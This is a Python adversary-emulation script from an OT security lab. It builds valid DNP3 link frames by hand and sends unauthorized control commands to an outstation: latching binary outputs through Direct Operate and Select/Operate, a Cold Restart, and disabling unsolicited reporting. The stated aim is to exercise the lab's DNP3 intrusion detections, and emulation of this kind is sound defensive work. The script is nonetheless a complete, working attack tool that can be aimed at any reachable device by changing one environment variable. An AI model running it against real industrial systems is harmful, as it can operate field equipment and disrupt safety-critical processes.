#!/usr/bin/env python3
"""
OT Security Lab - DNP3 adversary emulation from a compromised workstation.

Targets the real opendnp3 outstation endpoint over a legitimate Operations ->
Control conduit. The master link address is 3 (not in the authorized set), so
its control operations are ``DNP3_UNAUTHORIZED_CONTROL``; a cold restart and a
disable-unsolicited exercise the other two DNP3 detections.

The pybind11 ``dnp3-python`` master is not usable headless: its command
callbacks are invoked from C++ threads without the GIL and abort the process
(``PyThreadState_Get``). The endpoint still runs the real opendnp3 stack; this
emulation drives it with a minimal master that builds CRC-16/DNP-correct link
frames, so the outstation accepts them.
"""
import os
import socket
import time

HOST = os.getenv("OT_DNP3_OUTSTATION", "172.21.0.50")
PORT = int(os.getenv("OT_DNP3_PORT", "20000"))
MASTER_ADDR = int(os.getenv("OT_DNP3_MASTER_ADDR", "3"))
OUTSTATION_ADDR = int(os.getenv("OT_DNP3_OUTSTATION_ADDR", "10"))


# Reflected CRC-16/DNP (poly 0x3D65, init 0x0000, xorout 0xFFFF).
def crc16_dnp(data: bytes) -> int:
    crc = 0x0000
    for byte in data:
        crc ^= byte
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
    return (~crc) & 0xFFFF


def link_frame(application: bytes, control: int = 0xC4) -> bytes:
    user_data = b"\xC0" + application  # transport: FIR|FIN, sequence 0
    length = 5 + len(user_data)
    header = (
        bytes([length, control])
        + OUTSTATION_ADDR.to_bytes(2, "little")
        + MASTER_ADDR.to_bytes(2, "little")
    )
    frame = b"\x05\x64" + header + crc16_dnp(header).to_bytes(2, "little")
    for index in range(0, len(user_data), 16):
        block = user_data[index:index + 16]
        frame += block + crc16_dnp(block).to_bytes(2, "little")
    return frame


def send(sock: socket.socket, description: str, application: bytes) -> None:
    sock.sendall(link_frame(application))
    print(f"[DNP3] {description}", flush=True)
    time.sleep(0.4)


def main():
    print(f"--- DNP3 emulation against {HOST}:{PORT} (master addr {MASTER_ADDR}) ---", flush=True)
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        # Integrity poll (function code 1) so the session is exercised.
        send(sock, "Integrity poll (FC1)", b"\xC0\x01\x3C\x02\x06")
        # Direct Operate (FC5) on binary output 0: control code LATCH_ON.
        send(sock, "Direct Operate (FC5) LATCH_ON output 0", b"\xC0\x05\x0C\x01\x17\x01\x00\x03")
        # Select (FC3) then Operate (FC4) on output 1.
        send(sock, "Select (FC3) output 1", b"\xC0\x03\x0C\x01\x17\x01\x01\x03")
        send(sock, "Operate (FC4) output 1", b"\xC0\x04\x0C\x01\x17\x01\x01\x03")
        # Cold Restart (FC13).
        send(sock, "Cold Restart (FC13)", b"\xC0\x0D")
        # Disable Unsolicited (FC21) for classes 1-3.
        send(sock, "Disable Unsolicited (FC21)", b"\xC0\x15\x3C\x02\x06\x3C\x03\x06\x3C\x04\x06")
        time.sleep(1)
        try:
            sock.recv(4096)
        except OSError:
            pass
    print("--- DNP3 emulation complete ---", flush=True)


if __name__ == "__main__":
    main()
